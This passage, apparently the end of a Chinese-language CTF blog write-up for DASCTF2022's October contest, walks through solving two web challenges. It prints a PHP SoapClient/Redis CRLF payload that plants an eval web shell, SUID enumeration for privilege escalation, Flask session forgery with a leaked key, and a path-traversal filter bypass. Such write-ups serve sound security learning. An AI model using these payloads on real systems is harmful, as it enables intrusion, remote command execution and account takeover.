+</span></span><span style="display:flex;"><span>$option <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;location&#34;</span><span style="color:#f92672">=&gt;</span>$target,<span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;hello</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">AUTH 20220311</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">CONFIG SET dir /var/www/html</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">SET x &#39;&lt;?@eval(</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">_POST[1]);?&gt;&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">CONFIG SET dbfilename hack.php</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">SAVE</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">hello&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">swpu</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $wllm;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $arsenetang;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $l61q4cheng;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $love;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$s <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">swpu</span>();
+</span></span><span style="display:flex;"><span>$s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">wllm</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SoapClient&#34;</span>;
+</span></span><span style="display:flex;"><span>$s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">arsenetang</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>$s<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">l61q4cheng</span> <span style="color:#f92672">=</span> $option;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($s));
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031417218.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031417218.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031417218.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031417218.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031417218.png"
+        title="image-20221103141743048" /></p>
+<p>打payload进去</p>
+<p>然后访问我们写的hack.php 进行命令执行 成功，连接蚁剑</p>
+<!-- raw HTML omitted -->
+<p>然后找到flag文件 没有权限读，考虑SUID 提权</p>
+<pre tabindex="0"><code class="language-shel" data-lang="shel">find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p>这玩意在蚁剑下没有回显？ 在网站上进行执行后</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031436809.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031436809.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031436809.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031436809.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031436809.png"
+        title="image-20221103143631778" /></p>
+<p>有date就考虑date读取 <code>date -f</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031427325.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031427325.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031427325.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031427325.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211031427325.png"
+        title="image-20221103142759293" /></p>
+<h2 id="blogsystem">BlogSystem</h2>
+<blockquote>
+<p>刚学习完flask，用flask写了一个博客并放了一点文章上去</p>
+</blockquote>
+<p><a href="https://pysnow.cn/archives/566/" target="_blank" rel="noopener noreffer">https://pysnow.cn/archives/566/</a>
+ 出题人文章很详细，纯跟着学习一下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130103.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130103.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130103.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130103.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130103.png"
+        title="image-20221104113047529" /></p>
+<p>admin被注册了，考虑如何登录admin，用普通用户登录一下，有发布文章，修改密码，查看文章的功能</p>
+<p>然后就是在写的文章里，《flask基础总结》，发现了密钥泄露的情况  （跟着文章还学习了不少）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130985.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130985.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130985.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130985.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041130985.png"
+        title="image-20221104113025146" /></p>
+<blockquote>
+<p>知识点 flask伪造session</p>
+<p>工具：https://github.com/noraj/flask-session-cookie-manager</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>解密
+</span></span><span style="display:flex;"><span>python3 flask_session_cookie_manager3.py decode -c ceyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6IjEyMzEyMyJ9.Y2SOJw.VxdoMEDiLe2__2QHVJs9R6S8DwY -s 7his_1s_my_fav0rite_ke7
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041322987.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041322987.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041322987.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041322987.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041322987.png"
+        title="image-20221104132246944" /></p>
+<p>拿到正确的用户信息，现在伪造一下admin的session</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python3 flask_session_cookie_manager3.py encode -s 7his_1s_my_fav0rite_ke7 -t <span style="color:#e6db74">&#34;{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;admin&#39;}&#34;</span>
+</span></span></code></pre></div><p>拿到<code>eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2SiEw.epCgY0vgKMxePBuf7_kwhCpy1es</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041327818.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041327818.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041327818.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041327818.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041327818.png"
+        title="image-20221104132721247" /></p>
+<p>替换后成功admin登录，发现多了个download</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041331616.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041331616.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041331616.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041331616.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041331616.png"
+        title="image-20221104133105527" /></p>
+<p>这里考虑目录穿越</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041333581.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041333581.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041333581.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041333581.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041333581.png"
+        title="image-20221104133326553" /><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041335196.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041335196.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041335196.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041335196.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041335196.png"
+        title="image-20221104133520124" /></p>
+<p>测试一下，肯定是对..和//进行替换为空了</p>
+<p>要实现<code>../ </code>可以构造成 <code>.//./</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041342993.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041342993.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041342993.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041342993.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211041342993.png"
+        title="image-20221104134210929" /></p>
+<p>现在就可以翻源码，代码审计了</p>
+<p>入口点在<code>/app/app.py </code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> config
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config<span style="color:#f92672">.</span>from_object(config)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;7his_1s_my_fav0rite_ke7&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> model <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> view <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(index, name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;index&#39;</span>)
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>register_blueprint(blog, name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;blog&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.context_processor</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_statue</span>():
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;username&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> username:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            user <span style="color:#f92672">=</span> User<span style="color:#f92672">.</span>query<span style="color:#f92672">.</span>filter(User<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> user:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#34;username&#34;</span>: username, <span style="color:#e6db74">&#39;name&#39;</span>: user<span style="color:#f92672">.</span>name, <span style="color:#e6db74">&#39;password&#39;</span>: user<span style="color:#f92672">.</span>password}
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> e
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">404</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">page_not_found</span>(e):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;404.html&#39;</span>), <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.errorhandler</span>(<span style="color:#ae81ff">500</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">internal_server_error</span>(e):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;500.html&#39;</span>), <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">80</span>)
+</span></span></code></pre></div><p>后面有些不理解，待补充</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022十月赛" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022十月赛"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022十月赛"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022十月赛"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/" class="prev" rel="prev" title="Dest0g3 520迎新赛"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Dest0g3 520迎新赛</a>
+            <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/" class="next" rel="next" title="DASCTF2022九月赛">DASCTF2022九月赛<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
